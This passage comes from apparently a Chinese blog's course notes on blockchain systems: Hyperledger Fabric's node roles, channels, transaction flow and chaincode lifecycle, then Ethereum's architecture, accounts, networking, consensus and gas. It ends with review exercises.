<p>​    超级账本Fabric系统的Orderer节点的主要功能是实现共识管理。Client客户端节点发起的所有交易，经过Peer节点背书后，将统一发送给Orderer节点。Orderer节点负责接收属于不同通道的交易请求，按通道对接收到交易进行排序，再将交易信息打包进新的区块中，然后将新区块信息广播给对应通道的Peer节点。Orderer节点默认的排序服务端口是7050。</p>
<p>(3) Client客户端节点</p>
<p>​    超级账本Fabric系统的Client客户端节点一般表示用户或基于区块链的应用系统，作为实际交易的发起者，必须连接到一个Peer节点，实现对区块链系统的访问互动。Client客户端节点可以向多个具有背书功能角色的Peer节点提交新的交易提案，当收集到Peer节点回复的足够的背书后，就可以向Orderer排序节点发送交易，等待交易被写入新区块中。</p>
<p>(4) CA证书服务节点</p>
<p>​    超级账本Fabric系统的CA节点是X.509数字证书颁发机构，CA节点接收Client客户端节点的注册申请，以便获取身份证书，在超级账本Fabric系统网络上所有的操作都需要使用证书验证用户的身份。</p>
<p>​    在超级账本Fabric系统中，CA节点默认的证书服务端口是7054。</p>
<h4 id="多链与多通道"><a href="#多链与多通道" class="headerlink" title="多链与多通道"></a><strong>多链与多通道</strong></h4><p>超级账本Fabric系统区块链引入了多通道（Channel）机制，每个通道对应一条逻辑链和一个分布式账本，区块链网络的每个节点可以属于一个或多个通道，因此超级账本Fabric系统支持多链。</p>
<p>  超级账本Fabric系统主要用于构建联盟区块链，所谓联盟一般是由多个组织构成，网络中的Orderer节点、CA节点通常是由联盟链的发起与权威可信管理机构提供，网络中的Peer节点、Client客户端节点由联盟中的不同组织提供。如果联盟中包含一个组织，则构建的区块链就可以视为私有链。</p>
<p><strong>超级账本Fabric系统一个通道对应一条链和一个账本</strong>，一个通道中可以包含不同组织的多个Peer节点，每个组织的多个Peer节点中至少有一个主节点和锚节点。</p>
<p><strong>主节点：</strong></p>
<p>  主要用于在通道内接收Orderer节点的区块广播，并将验证后的区块通过Gossip协议传播给通道内所属组织的其它Peer节点进行记账。</p>
<p><strong>锚节点：</strong></p>
<p>  主要用于在组织内及通道内跨组织的节点发现，一个组织在通道内的Peer节点可以通过其他组织的锚节点发现其他组织在该通道内的所有Peer节点。</p>
<h4 id="节点发现管理"><a href="#节点发现管理" class="headerlink" title="节点发现管理"></a>节点发现管理</h4><p>【这里有图片但是没有截屏】</p>
<ul>
<li><strong>在超级账本Fabric系统的P2P网络中，任何Peer节点都属于某个组织，一个组织至少包含两个以上的Peer节点，不存在无组织的Peer节点。同一组织的Peer节点之间，可以相互作为“Gossip启动引导节点”。</strong></li>
</ul>
<h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a>交易广播</h4><p>在超级账本Fabric系统网络中，客户端节点负责构造并提交交易提案（TxProposal）请求，交易提案一般包含以下信息：</p>
<p> (1) ChannelID：交易所属的通道编号</p>
<p> (2) ChaincodeID：交易需要调用的链码（智能合约）</p>
<p> (3) Timestamp：交易的时间戳</p>
<p> (4) Sign：客户端签名</p>
<p> (5) TxPayload：交易所包含的事务，具体包括要调用的链码的函数及相关参数（Operation）、调用的相关属性（Metadata）等。</p>
<p><strong>客户端节点会向已知的多个具有背书功能角色的Peer节点提交交易提案，Peer节点对接收到的交易提案请求进行验证，具体验证内容包括：</strong></p>
<p> <strong>• 验证交易提案的格式是否正确；</strong></p>
<p> <strong>• 验证交易是否重复提交；</strong></p>
<p> <strong>• 验证交易提案中的客户端签名是否有效；</strong></p>
<p> <strong>• 验证交易提案的发送方在相关通道中是否具有对应的执行权限。</strong></p>
<p><strong>Peer节点对交易提案验证通过后，将调用交易提案中相关的链码进行模拟执行，生成包含响应值、读&#x2F;写集的事务结果，对结果进行背书并向客户端节点回复交易提案响应（ProposalResponse）消息。</strong></p>
<p><strong>当客户端节点收集到经过Peer节点背书的交易提案响应满足认可策略后，便基于收集到的经过背书的提案响应构建交易请求，并向Orderer节点广播交易请求。</strong></p>
<p><strong>Orderer节点接收到交易请求后，根据不同的通道，按时间顺序对它们进行排序，并组装新区块，之后将新区块广播给对应通道内的不同组织中的Leader节点。</strong></p>
<h4 id="区块广播与同步"><a href="#区块广播与同步" class="headerlink" title="区块广播与同步"></a><strong>区块广播与同步</strong></h4><p>Orderer节点将根据区块所属的通道ID，将新区块广播到同一通道中的Peer节点，Peer节点接收到新区块后，<strong>会先对区块进行验证</strong>，具体包括：</p>
<p>  <strong>(1) 验证区块中的交易是否满足背书策略。</strong></p>
<p>  <strong>(2) 验证区块的数据是否正确。</strong></p>
<p>  <strong>(3) 验证区块中的每个交易，确保交易中的读&#x2F;写集与状态数据库的数据一致。</strong></p>
<p>   <strong>通过Peer节点的上述验证后，新区块中的交易会被打上合法或非法交易的标签，然后将区块添加到通道对应的区块链上，同时把所有合法交易的读&#x2F;写集中的“写”集合保存到状态数据库。</strong></p>
<p><strong>每个Peer节点都通过Gossip协议不断地接收来自多个节点已完成一致性的区块数据。为了保证安全和通道隔离性，每条传输的Gossip消息都有发送节点的签名，一方面杜绝恶意节点发出伪造消息，另一方面可以防止将消息分发给不在同一通道中的其它Peer节点。</strong></p>
<p>​    <strong>新区块的传播过程如下：</strong></p>
<p>​    <strong>(1) 某个Peer节点接收到一个需要传播给其他节点的新区块消息；</strong></p>
<p>​    <strong>(2) 该Peer节点将消息发送给随机选择的预定数量的其它相连节点；</strong></p>
<p>​    <strong>(3) 收到消息的Peer节点再将消息发送给（随机选择的）预定数量的其它相连节点（不包括发送消息的节点）；</strong></p>
<p>​    <strong>(4) 如此不断反复，直到每个Peer节点都收到消息。</strong></p>
<h3 id="共识层"><a href="#共识层" class="headerlink" title="共识层"></a>共识层</h3><p><strong>首先要认识在超级账本Fabric系统中一次交易从客户端节点发起到被打包进区块，最终被写入区块链的全过程。</strong></p>
<p>【8】</p>
<p><strong>(1)</strong> <strong>交易发起者通过客户端应用程序调用PKI</strong> <strong>CA证书服务进行注册和登记，并获取身份证书</strong>；</p>
<p><strong>(2) 交易发起者通过客户端应用程序向超级账本Fabric系统区块链网络发起一个交易提案，交易提案包含本次交易要调用的链码名称、链码方法和参数信息以及交易签名等信息，并根据背书策略将交易提案发送给指定通道中的不同组织的背书Peer节点。</strong></p>
<p>   <strong>背书Peer节点对接收到的交易提案请求进行验证，验证通过后调用交易提案中相关链码进行模拟执行，得到交易响应结果，对结果进行背书后返回给客户端，注意此时区块链系统状态与账本数据并没有被真正修改。</strong></p>
<p><strong>客户端应用程序收到背书Peer节点返回的交易响应结果后，判断是否收到满足背书策略的足够多的背书结果，如果收到足够的背书，就将交易提案、交易响应和背书列表等信息打包组成一个交易并签名，然后发送给Orderer排序节点，否则交易失败，中止处理，该交易将被舍弃</strong></p>
<p><strong>(3) Orderer排序节点负责从区块链系统所有通道接收交易请求，分通道对“交易”按时间排序并打包成区块，然后将新区块广播给对应通道不同组织的Peer主节点</strong>。</p>
<p><strong>(4) Peer主节点收到新区块后，会对区块中的区块数据部分包含的每笔交易进行验证，检查交易依赖的输入输出是否符合当前区块链的状态，验证背书策略是否满足，验证完成后将新区块追加到本地的区块链，更新账本，并修改世界状态。</strong></p>
<p><strong>(5) 各组织的同一通道的Peer节点之间会通过P2P网络协议相互同步区块链与账本数据，确保所有Peer节点本地的区块链与账本副本保持数据一致。</strong></p>
<hr>
<p><strong>在超级账本Fabric系统中，所有交易在发送到区块链网络相关通道以后，都要经由Orderer排序节点对交易顺序进行共识排序，然后将交易按排好的顺序打包进区块，保证了任意一笔交易在区块链中的位置，以及在整个区块链网络中各节点的一致性和唯一确定性。</strong></p>
<p><strong>Fabric系统的共识服务由Orderer排序节点完成，并且允许多种共识算法以插件的形式应用于排序节点，系统默认提供Solo单节点共识、Kafka分布式队列共识等共识机制。</strong></p>
<p><strong>(1)</strong> <strong>Solo单节点共识</strong></p>
<p><strong>(2)</strong> <strong>Kafka分布式队列共识</strong>   </p>
<p>【9】</p>
<p>  Kafka是一个开源的分布式高可用消息队列系统，可以有序的管理消息并在多个冗余副本节点间保证数据一致性。当超级账本Fabric系统采用该共识机制时，会基于Kafka构建由多个Orderer排序节点组成的集群，提供基于Kafka集群的排序功能，支持CFT（Crash Fault Tolerence）容错（无恶意节点情况下的容错）和持久化，也可以进行扩展。</p>
<h3 id="激励层"><a href="#激励层" class="headerlink" title="激励层"></a>激励层</h3><p><strong>超级账本Fabric系统的设计初衷是用于构建联盟链，解决联盟中多组织之间的信任协作问题，区块链网络节点一般是由联盟主管机构或联盟中的多个组织提供和维护，超级账本Fabric系统内部不提供任何加密货币相关的发行和支付功能，因此，超级账本Fabric系统不提供与比特币、以太坊等系统的激励层功能。但是，在互联网环境中可以将超级账本Fabric系统与外部加密货币系统或第三方支付系统结合来实现类似的激励功能。</strong></p>
<h3 id="合约层"><a href="#合约层" class="headerlink" title="合约层"></a>合约层</h3><p>在超级账本Fabric系统中，智能合约称为“链码”（Chain Code），链码是一种遵循相关开发和部署规范的执行特定合约业务功能的可运行程序，系统合约层提供了对链码的全生命周期管理，涉及链码从开发到部署运行的整个过程。</p>
<p>l链码通过区块存储于区块链网络，能够独立运行在所属通道的Peer节点上的Docker容器中，以gRPC协议与相应的Peer节点进行通信，是对区块链系统与分布式账本中的数据进行增、删、改、查等操作的服务接口，可以根据不同的智能合约需求实现不同的复杂应用。</p>
<p>超级账本Fabric系统的链码分为两类：<strong>系统链码和用户链码。</strong></p>
<p><strong>(1)</strong> <strong>系统链码</strong></p>
<p>​    <strong>系统链码一般由超级账本Fabric开源项目社区开发与维护，只能采用Go语言开发，主要提供超级账本Fabric系统级功能，在区块链网络节点启动时会自动完成注册和部署。系统链码主要包括配置管理链码（CSCC）、生命周期管理链码（LSCC）、查询管理链码（QSCC）、交易背书链码（ESCC）和交易验证链码（VSCC）等5类。</strong></p>
<p><strong>• 配置管理链码（CSCC）：负责处理网络Peer节点端的通道配置，包括加入新的通道和查询给定通道的对应配置等功能。</strong></p>
<p><strong>• 生命周期管理链码（LSCC）：负责对用户链码的生命周期进行管理，管理在背书节点上的链码部署，主要包括链码的安装、实例化、升级等功能。</strong></p>
<p><strong>• 查询管理链码（QSCC）：提供账本查询API，如获取区块链、区块、交易等信息。其提供的API接口包括根据交易号查询交易、根据区块号获取区块、根据区块哈希获取区块、根据交易号获取区块和根据通道名称获取最新区块链信息等。</strong></p>
<p><strong>• 交易背书管理链码（ESCC）：负责背书（签名）过程，并支持对背书策略进行管理。对提交的交易提案的模拟运行结果进行签名，之后创建响应消息返回给客户端。</strong></p>
<p><strong>• 交易验证链码（VSCC）：负责在记账前提供区块及交易的验证功能。</strong></p>
<p><strong>(2) 用户链码</strong></p>
<p>​    <strong>用户链码与系统链码定位不同，系统链码实现超级账本Fabric系统的内置功能，而用户链码一般是由基于区块链的应用系统开发人员根据智能合约实际应用场景设计开发的链码，支持使用Go语言、Java语言、JavaScript语言来开发，在基于超级账本区块链的应用系统中具有重要地位和作用，用户链码对外为应用系统提供智能合约服务接口，对内可以对整个区块链系统与账本进行数据读写操作，如果一个应用系统没有通过用户链码与超级账本Fabric系统进行交互，这个应用系统就不是一个真正意义上的基于区块链的应用系统。</strong></p>
<h4 id="智能合约生命周期管理"><a href="#智能合约生命周期管理" class="headerlink" title="智能合约生命周期管理"></a><strong>智能合约生命周期管理</strong></h4><p>​    在超级账本Fabric系统中，链码生命周期管理主要涉及用户链码的<strong>开发、安装、实例化、运行、升级</strong>等阶段，超级账本Fabric系统1.4版本和2.0版本在部分阶段略有不同，如图所示。</p>
<p>【10】</p>
<p><strong>• 开发阶段</strong>：用户根据智能合约应用需求，使用Go语言、Java语言等设计开发链码程序，在链码程序中使用系统SDK接口操作区块链系统及账本，实现智能合约功能需求，代码开发，形成的Go语言、Java语言等编写的链码文件。</p>
<p><strong>• 安装阶段</strong>：管理员指定链码的名称和版本号，将链码文件打包发送给网络Peer节点（背书节点），节点将链码包以链码名称和版本号的组合形式存储在本地特定的目录下。</p>
<p><strong>• 实例化阶段</strong>：管理员指定通道、链码名称、版本号、背书策略和链码初始化函数，向已安装链码的Peer节点发起实例化请求，Peer节点从本地链码包获取链码文件。根据不同的链码语言，Peer节点使用对应语言的编译器编译链码文件，进而生成可执行文件，并将可执行文件打包生成一个Docker容器镜像，然后使用该镜像创建一个运行对应链码的容器，容器启动后链码与Peer节点之间通过gRPC进行通信。</p>
<p><strong>• 运行阶段</strong>：在运行过程中，链码主要接收并处理客户端发起的交易操作。应用系统或用户通过客户端向Peer节点发起对应链码的调用请求，Peer节点将请求转发给链码。链码执行智能合约逻辑，对区块链系统及账本状态进行增、删、改、查等操作，并将执行结果返回给调用方。</p>
<p><strong>• 升级阶段</strong>：根据智能合约应用需求的变化，链码的功能也随之需要扩展升级，该阶段主要是使用新的链码文件上传到Peer节点，然后生成新的链码镜像和容器。链码在升级过程中，链码名称必须要保持一致，链码版本号必须不同。</p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>链原——以太坊系统</title>
    <url>/2024/12/11/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="以太坊系统"><a href="#以太坊系统" class="headerlink" title="以太坊系统"></a>以太坊系统</h2><h3 id="以太坊区块链系统架构"><a href="#以太坊区块链系统架构" class="headerlink" title="以太坊区块链系统架构"></a><strong>以太坊区块链系统架构</strong></h3><p><strong>以太坊区块链系统依然是P2P体系结构，即对等网络结构</strong></p>
<p><strong>以太坊系统每个节点都可以存储完整的区块链与账本数据，每个节点都可以发起和监听以太坊网络上的交易信息，验证每个交易和区块的合法性；</strong></p>
<p><strong>每个节点都可以交易的形式发布智能合约，智能合约将存储于区块链中，加载到每个节点上的以太坊虚拟机EVM中执行</strong></p>
<p>虽然每个以太坊系统节点上都安装了对等的以太坊系统软件，但是每个节点可以自由选择启动以太坊系统的不同功能，从而属于不同的节点类型，在区块链网络中扮演不同的角色。目前，以太坊系统的节点总体上可以分为<strong>“全节点”、“轻节点”、“存档节点”</strong>等类型，其中发挥核心作用的是<strong>全节点。</strong></p>
<p>【1】</p>
<h4 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a><strong>系统逻辑架构</strong></h4><p>【2】</p>
<p>以太坊系统的存储层主要采用文件系统和LevelDB Key-Value数据库，为以太坊系统相关的区块链、分布式账本、智能合约、X.509数字证书、日志、配置文件等数据提供高效、可靠持久化存储服务。</p>
<p>以太坊系统的数据层是系统核心功能层级之一，对以太坊系统核心的区块、区块链、交易、账本、账户、地址、状态树、交易树、收据树等关键数据结构进行定义和处理，负责将交易打包进区块，由区块组成区块链，并构建了状态树、交易树、收据树等数据结构。同时以太坊系统采用了传统的账户&#x2F;余额模型构建账本数据，更加易于理解，并基于底层的存储服务提供对以太坊区块链数据的安全读写访问管理。</p>
<p><strong>以太坊系统的网络层是系统核心功能层级之一，主要采用结构化P2P网络</strong>，基于Kademlia分布式哈希表协议，实现网络节点快速发现与连接，以及区块、交易数据的分发与同步，为以太坊系统各网络节点之间提供节点发现与安全连接通信机制，为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。</p>
<p><strong>以太坊系统的共识层</strong>是系统核心功能层级之一，系统前期版本采用与比特币系统类似的PoW工作量证明共识机制，但是对PoW共识算法进行了改进优化，没有采用比特币系统单纯依赖算力的双SHA-256哈希计算，而是使用了同时依赖于算力和内存容量的ETHash算法，系统后期版本计划支持算力无关的PoS权益证明共识机制。</p>
<p><strong>以太坊系统的激励层</strong>在共识层的功能基础上，采用无总量限制的以太币发行机制，与比特币系统的激励机制不同，除了出块激励外，还增加了叔块激励和交易服务费等激励机制。</p>
<p><strong>以太坊系统的合约层</strong>首次定义并提供了强大的智能合约功能，智能合约可以基于Solidity等多种图灵完备的编程语言开发实现，并提供了专用的以太坊虚拟机EVM作为智能合约的安全隔离运行环境。</p>
<p><strong>以太坊系统的接口层</strong>提供了基于JSON RPC、Web3.js的SDK接口和命令行接口。</p>
<p>   <strong>以太坊系统的应用层</strong>基于接口层提供的SDK接口，可以基于以太坊区块链实现面向多种应用场景和业务逻辑的公有链或DApp去中心化应用。</p>
<h3 id="以太坊系统数据层"><a href="#以太坊系统数据层" class="headerlink" title="以太坊系统数据层"></a><strong>以太坊系统数据层</strong></h3><h4 id="区块与区块链"><a href="#区块与区块链" class="headerlink" title="区块与区块链"></a><strong>区块与区块链</strong></h4><p><strong>以太坊区块的区块体除了包含交易列表外，还包含一个特殊的叔区块（Uncle Block）头部分。</strong></p>
<p>【4】</p>
<p>【3】</p>
<h4 id="账本数据"><a href="#账本数据" class="headerlink" title="账本数据"></a><strong>账本数据</strong></h4><ul>
<li><p>以太坊的分布式账本采用了传统记账系统的账户模型，即每个用户对应一个直接记录余额的账户，交易中附带有参与交易的账户的信息。以太坊用账户来记录系统状态，包括每个账户存储余额信息、智能合约代码和内部数据存储等。</p>
</li>
<li><p>相比于比特币的UTXO模型，以太坊所采用的传统账户&#x2F;余额模型显然更易于理解和进行智能合约的编程。</p>
</li>
<li><p>以太坊的每一个账户都由公钥密码机制生成的一对公私钥进行定义，账户地址是采用一种SHA-3（Keccak-256）哈希算法对公钥数据进行哈希计算的32字节结果的后20字节数据的40位十六进制字符表示。</p>
<p>【5】</p>
</li>
</ul>
<p><strong>以太坊系统有两类账户：</strong></p>
<p>  <strong>(1) 外部账户EOA（Externally Owned Account）</strong>**</p>
<p>​    <strong>外部账户是给以太币拥有者分配的账户，拥有该账户的用户可以通过账户对应的私钥创建和签署交易，发送消息至其他外部账户或合约账户。</strong></p>
<p>  <strong>(2) 合约账户COA（Contract Account）</strong></p>
<p>​    <strong>合约账户是一种特殊用途的账户，用于存储执行的智能合约代码，只能被外部账户触发从而执行其对应的合约代码，从而执行各种预先定义好的操作。</strong></p>
<h4 id="交易数据"><a href="#交易数据" class="headerlink" title="交易数据"></a>交易数据</h4><h4 id="状态数据"><a href="#状态数据" class="headerlink" title="状态数据"></a><strong>状态数据</strong></h4><p>  在以太坊系统中，所有账户（外部账户与合约账户）的状态共同构成了以太坊系统的状态。以太坊系统用一棵采用默克尔帕特里夏MPT树型数据结构定义的“全局状态树”来保存每个区块产生时系统的状态，并在当时的区块中保存了状态树的根哈希。</p>
<ul>
<li><p>状态树中的每个叶子节点都表示一个账户状态，当新区块被产生时，状态树的根哈希值将被写入区块中，期间只会有小部分的账户状态会发生改变，状态树中只有部分节点状态会改变。</p>
</li>
<li><p>为了节省存储空间，并不是每个区块都独立构建一棵状态树，而是共享状态树的节点数据，针对发生改变的节点状态，会新建一些分支，而不是更新原节点的状态数据，历史状态数据都将被保留。</p>
</li>
</ul>
<h3 id="以太坊系统网络层"><a href="#以太坊系统网络层" class="headerlink" title="以太坊系统网络层"></a><strong>以太坊系统网络层</strong></h3><h4 id="P2P网络结构与节点"><a href="#P2P网络结构与节点" class="headerlink" title="P2P网络结构与节点"></a><strong>P2P网络结构与节点</strong></h4><p>以太坊系统网络层位于数据层之上、共识层之下，是系统的核心功能层次之一，主要提供以下网络管理功能：</p>
<p>  (1) 区块链P2P网络的组网管理</p>
<p>  (2) 各网络节点的节点发现、连接与通信管理</p>
<p>  (3) 新区块或交易数据广播管理</p>
<p>  (4) 各网络节点之间区块链数据同步管理</p>
<p><strong>(1)全节点</strong></p>
<p>​    <strong>以太坊系统的网络全节点需要保存全链数据，全节点所需的储存空间也在不断增长。</strong></p>
<p>​    <strong>以太坊系统网络全节点的主要工作包括：</strong></p>
<p>​    • 将系统所有区块链与状态数据存储在节点本地，建立全链数据副本，可以根据请求为网络提供任何公开数据。</p>
<p>​    • 接收并验证新区块数据，若新区块通过验证，就保存在本地的区块链中，并向其它邻近节点广播区块数据。</p>
<p>​    • 接收并验证其他帐户或去中心化应用DApp发出的交易数据，若新交易通过验证，就保存在本地的交易池中，并向其它邻近节点广播交易数据。</p>
<p>   • 通过求解指定的PoW工作量证明计算难题来竞争新区块的出块权，从而获得以太币激励，并把多条交易记录打包写入新区块。</p>
<p>   • 对存储在区块链中的智能合约进行部署与执行。</p>
<p><strong>（2) 轻节点</strong></p>
<p>​    以太坊系统网络轻节点不需储存和维护完整的区块链数据副本，只存储所有的区块头数据，可以通过检验区块头中包含的状态树根哈希，并按需向全节点请求相关区块链信息，从而验证数据的有效性。轻节点一般用于发送或传递交易信息，对节点的CPU计算性能、内存容量、磁盘容量、运行稳定性都要求较低。</p>
<p><strong>(3) 存档节点</strong></p>
<p>​    存档节点存储了所有全节点保存的内容，同时创建了历史状态的档案，存档节点不参与竞争出块权的共识计算，一般只提供状态查询服务，例如，如果要查询一个账户在以太坊区块高度1000000时的以太币余额，就要查询一个存档节点。</p>
<h4 id="节点发现管理"><a href="#节点发现管理" class="headerlink" title="节点发现管理"></a><strong>节点发现管理</strong></h4><h4 id="节点连接管理"><a href="#节点连接管理" class="headerlink" title="节点连接管理"></a><strong>节点连接管理</strong></h4><p>​    <strong>以太坊网络的节点连接涉及到Peer（对等节点）、Session（会话）、Capability（能力）等基本概念。</strong></p>
<p>  (1) Peer：在以太坊系统的P2P网络中，Peer与节点（Node）是不同层次的对象，节点更底层，在NodeTable中进行管理，Peer是建立TCP连接会话的对象。</p>
<p>  (2) Session：在以太坊系统的P2P网络中，Session是节点连接管理中最重要的结构，Session表示Peer之间真正建立了连接后的逻辑关系。</p>
<p>  (3) Capability：指节点能支持的功能，表示以太坊系统在P2P网络通信层之上的业务能力，P2P网络只提供节点之间的连接通道，具体要传输什么数据，由节点支持的Capability决定，此外，由于以太坊系统经过多次升级，不同节点上安装运行的以太坊系统版本可能不同，为了实现系统向后兼容，节点连接时需要确定都可以支持的Capability集合。</p>
<h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a><strong>交易广播</strong></h4><p>在以太坊系统的P2P网络中，交易的广播过程如下：</p>
<p>  (1) 每个节点会针对每个邻近节点维护一个待发送交易列表TxsA和已知交易列表TxsB；</p>
<p>  (2) 当节点接收到一个新交易Tx时，会先查询哪些邻近节点没有该交易信息，并将交易Tx加入邻近节点对应的待发送交易列表TxsA中；</p>
<p>  (3) 节点向每个待发送交易列表TxsA不为空的节点异步发送交易；</p>
<p>  (4) 交易发送成功后，会将被发出的交易加入对应邻近节点的已知交易列表TxsB。</p>
<h4 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a><strong>交易池</strong></h4><p><strong>以太坊系统也有交易池机制，交易池中的交易信息来源主要包括：</strong></p>
<p>  <strong>(1)本地提交：通过第三方应用调用以太坊网络节点本地的RPC服务提交的交易。</strong></p>
<p>  <strong>(2)广播同步：通过交易广播与同步，将其它节点的交易数据同步到该节点交易池。</strong></p>
<p>注意：当节点在竞争计算出块权时，会从交易池中获取并验证数条交易信息打包到区块中，如果节点成功获得出块权，新区块会被广播，此时新区块中包含的交易信息不会马上从交易池中删除，直到新区块被以太坊系统区块链确认，新区块中包含的交易才会从交易池中删除。如果以太坊系统的区块链发生了分叉，写进分叉的区块中包含的交易也不会从交易池中删除，而是继续在交易池中等待重新打包。</p>
<h4 id="区块广播与同步"><a href="#区块广播与同步" class="headerlink" title="区块广播与同步"></a><strong>区块广播与同步</strong></h4><p>(1) 节点A假如连接了n个节点，从相邻节点中选出sqrt(n)个节点广播包含完整区块信息的消息，向剩余的sqrt(n)个节点只广播区块哈希的消息；</p>
<p>(2) 收到到节点A广播的完整区块信息的节点，会将收到的区块加入等待验证的区块队列；</p>
<p>(3) 收到节点A广播的区块哈希的节点，根据需要可以从发送给它消息的节点A那里获取对应的完整区块，获取区块后再加入到等待验证的区块队列；</p>
<p>(4) 等待验证的区块队列中的区块经过验证确认后，最终插入节点本地区块链，节点再将新区块哈希广播给与它相连但还不知道该新区块的节点。</p>
<h3 id="以太坊系统共识层"><a href="#以太坊系统共识层" class="headerlink" title="以太坊系统共识层"></a>以太坊系统共识层</h3><h4 id="PoW工作量证明共识机制"><a href="#PoW工作量证明共识机制" class="headerlink" title="PoW工作量证明共识机制"></a><strong>PoW工作量证明共识机制</strong></h4><p>以太坊采用了Ethash算法作为其工作量证明算法。Ethash算法具有与算力大小和内存容量均相关的特性。</p>
<h4 id="PoS共识机制"><a href="#PoS共识机制" class="headerlink" title="PoS共识机制"></a><strong>PoS共识机制</strong></h4><p><strong>每一轮记账权由当时具有最高权益值的节点获得，最高权益值的计算并不仅仅依赖于节点算力的高低</strong></p>
<h3 id="以太坊系统激励层"><a href="#以太坊系统激励层" class="headerlink" title="以太坊系统激励层"></a><strong>以太坊系统激励层</strong></h3><p><strong>(1)</strong> <strong>加密货币总量无限制</strong>：以太坊系统并没有规定以太币的供应上限。</p>
<p><strong>(2)</strong> <strong>出块激励</strong>：以太坊系统没有出块奖励减半机制，以太坊系统上线之初每个新区块的出块奖励为5个以太币。在以太坊系统第三个阶段（大都会阶段），出块奖励调整过两次：2017年10月的拜占庭升级，出块奖励由5个以太币降为3个；2019年3月的君士坦丁堡升级，出块奖励由3个以太币降为2个；未来以太坊的出块奖励可能还会继续调整。</p>
<p><strong>(3)</strong> <strong>叔块激励</strong>：为了提高系统的交易性能，以太坊系统把出块时间缩短到平均10秒左右，更短的出块时间意味着在同一时刻，可能出现多个节点都求解出难题获得了新区块的记账权，但是在这些新区块中，只有一个将成为最长链上的区块，而其它区块，如果能被后续区块引用，将被称为叔块。</p>
<p><strong>(4)</strong> <strong>交易激励</strong>：在以太坊系统中，每一次交易的执行都需要消耗一定的费用，这个费用被命名为“燃料（Gas）”，Gas的值并不直接使用以太币ETH表示，而是使用GWei作为单位，</p>
<p>  <strong>例如：8 GWei &#x3D; 0.000000008 ETH</strong></p>
<p>   <strong>在以太坊系统的交易数据中有Gas的单价（Price）与需要消耗的Gas数量（GasLimit）属性，交易费用的计算公式如下：</strong></p>
<p>   <strong>交易费 &#x3D; Gas的单价 × 消耗的Gas数量</strong></p>
<p>   在以太坊系统中，交易可分为转账类型与智能合约相关类型，<strong>每一笔转账类型的交易，无论转账数额大小，系统规定最少消耗21000个 Gas数量</strong>，如果要在交易中额外添加备注信息，需要消耗额外的 Gas数量。</p>
<h4 id="l叔块机制"><a href="#l叔块机制" class="headerlink" title="l叔块机制"></a>l<strong>叔块机制</strong></h4><h3 id="以太坊系统合约层"><a href="#以太坊系统合约层" class="headerlink" title="以太坊系统合约层"></a><strong>以太坊系统合约层</strong></h3><h4 id="智能合约机制"><a href="#智能合约机制" class="headerlink" title="智能合约机制"></a><strong>智能合约机制</strong></h4><p>以太坊智能合约是一种采用Solidity语言开发的程序，经过编译的合约程序，只能通过以太坊合约账户以交易的形式发布到区块链上，交易信息中将附带合约程序的全部二进制字节码数据，并被打包保存到区块中，因此利用区块链的特性，智能合约一旦发布，合约的签订方就不可能被篡改或抵赖。</p>
<p><strong>以太坊系统合约层提供对智能合约的全生命周期管理，包括合约的创建、合约的部署运行、合约的调用执行、合约的作废。</strong></p>
<h3 id="课后"><a href="#课后" class="headerlink" title="课后"></a>课后</h3><p><strong>（一）填空题</strong></p>
<p><strong>1. 在以太坊系统中，每个区块由      、     和      三部分组成。</strong></p>
<p><strong>2. 以太币的标准单位是      ，最小单位是      ，1个标准单位的以太币等于       个最小单位的以太币。</strong></p>
<p><strong>3. 以太坊网络中存在      、       、      等不同类型的节点，其中      节点所需的存储空间最大。</strong></p>
<p><strong>4. 在以太坊系统中，账户分为       和       两类。</strong></p>
<p><strong>5. 在以太坊系统中，创建智能合约类型交易的交易接收方地址值为      。</strong></p>
<p><strong>6. 以太坊智能合约的全生命周期包括      、      、      和合约的作废。</strong></p>
<p><strong>（二）选择题</strong></p>
<p><strong>1. 在以太坊系统区块链的每个区块中不包含（   ）的哈希值。</strong></p>
<p><strong>A. 父区块      B. 交易树根      C. 子区块       D. 收据树根</strong></p>
<p><strong>2. 以太坊系统采用（   ）模型构建分布式账本，即每个用户都有直接的余额信息。</strong></p>
<p><strong>A. UTXO      B. 账户       C. 数据库       D. 会计</strong></p>
<p><strong>3. 以太坊系统是使用（   ）作为账户的唯一索引标识。</strong></p>
<p><strong>A. 地址      B. 伪随机数     C. 账户编号      D. 随机数</strong></p>
<p><strong>4. 在以太坊系统中，用于保存用户拥有的以太币余额的账户是（   ）。</strong></p>
<p><strong>A. 合约账户    B. 外部账户     C. 普通账户      D. 交易账户</strong></p>
<p><strong>5. 在以太坊系统中，交易可以分为多种类型，下面不属于以太坊交易类型的是（   ）。</strong></p>
<p><strong>A. 转账支付    B. 创建合约     C. 创建账户      D. 调用合约</strong></p>
<p><strong>6. 以太坊系统采用的共识机制主要依赖节点的（    ）进行出块权的竞争计算。</strong>**</p>
<p><strong>A. 算力      B. 内存容量     C. 算力+内存容量   D. 网络带宽</strong></p>
<p><strong>7. 以太坊系统智能合约采用的系统默认开发语言是（    ）。</strong></p>
<p><strong>A. Java       B. Go        C. Solidity       D. JavaScript</strong></p>
<p><strong>8. 在以太坊系统中，一个创建合约类型的交易的接收方地址（Recipient）字段值应为（    ）。</strong></p>
<p><strong>A.节点地址    B.空          C.外部账户地址     D.合约账户地址</strong></p>
<p><strong>9. 以太坊系统除了正在使用的PoW共识机制外，计划在后续版本中支持（   ）共识机制。</strong></p>
<p><strong>A. Paxos      B. PoS        C. DPoS        D. PBFT</strong></p>
<p><strong>（三）简答题（任选3道）</strong></p>
<p><strong>1. 请简述以太坊系统的区块链中各个区块是怎么链接的？</strong></p>
<p><strong>2. 请简述以太坊系统的账户地址是怎样生成的？</strong></p>
<p><strong>3. 请简单分析以太坊系统PoW共识机制节点竞争计算生成新区块的过程？</strong></p>
<p><strong>4. 请简述为什么以太坊系统要引入叔区块（UncleBlock）机制？</strong></p>
<p><strong>5. 请简单分析以太坊系统的账户与与传统的中心化系统的账户具有的不同之处？</strong></p>
